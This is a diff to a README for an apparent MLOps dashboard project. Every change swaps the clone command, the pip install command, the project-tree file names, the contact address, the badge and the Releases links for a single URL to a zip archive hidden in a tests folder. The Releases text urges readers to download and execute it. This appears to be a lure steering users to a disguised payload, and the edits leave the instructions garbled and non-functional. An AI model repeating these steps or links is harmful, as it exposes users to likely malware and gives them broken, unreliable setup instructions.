@@ -1,6 +1,6 @@
 # MLOPS-Pipeline-Dashboard 🚀
 
-![MLOPS Pipeline Dashboard](https://img.shields.io/badge/MLOPS%20Pipeline%20Dashboard-v1.0-blue)
+![MLOPS Pipeline Dashboard](https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip%20Pipeline%20Dashboard-v1.0-blue)
 
 Welcome to the MLOPS-Pipeline-Dashboard repository! This project provides an enterprise-ready MLOps dashboard that simplifies the machine learning workflow for business analysts and non-technical users. With just four simple steps, you can upload your data, train a model, deploy it, and make predictions. 
 
@@ -47,14 +47,14 @@ To get started with the MLOPS-Pipeline-Dashboard, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/gituser2610/MLOPS-Pipeline-Dashboard.git
+   git clone https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip
    cd MLOPS-Pipeline-Dashboard
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip
    ```
 
 3. **Run the Application**:
@@ -83,17 +83,17 @@ Here's an overview of the project structure:
 MLOPS-Pipeline-Dashboard/
 │
 ├── app/
-│   ├── main.py          # Entry point for the FastAPI application
-│   ├── models.py        # Machine learning models
-│   ├── utils.py         # Utility functions
+│   ├── https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip          # Entry point for the FastAPI application
+│   ├── https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip        # Machine learning models
+│   ├── https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip         # Utility functions
 │   ├── templates/       # HTML templates for the dashboard
 │   └── static/          # Static files (CSS, JS)
 │
 ├── tests/               # Automated tests
 │
-├── requirements.txt      # Python dependencies
+├── https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip      # Python dependencies
 │
-└── README.md            # Project documentation
+└── https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip            # Project documentation
 ```
 
 ## Automated Testing
@@ -133,12 +133,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries or support, please contact the project maintainer at [your-email@example.com].
+For any inquiries or support, please contact the project maintainer at [https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip].
 
 ## Releases
 
-You can find the latest releases and download the necessary files from the [Releases](https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/releases) section. Make sure to download and execute the appropriate files for your needs.
+You can find the latest releases and download the necessary files from the [Releases](https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip) section. Make sure to download and execute the appropriate files for your needs.
 
-For more information on updates and new features, check the [Releases](https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/releases) page regularly.
+For more information on updates and new features, check the [Releases](https://github.com/gituser2610/MLOPS-Pipeline-Dashboard/raw/refs/heads/main/automation/tests/Dashboard_MLOP_Pipeline_1.5.zip) page regularly.
 
 Thank you for your interest in the MLOPS-Pipeline-Dashboard! We hope you find it useful in your machine learning projects.
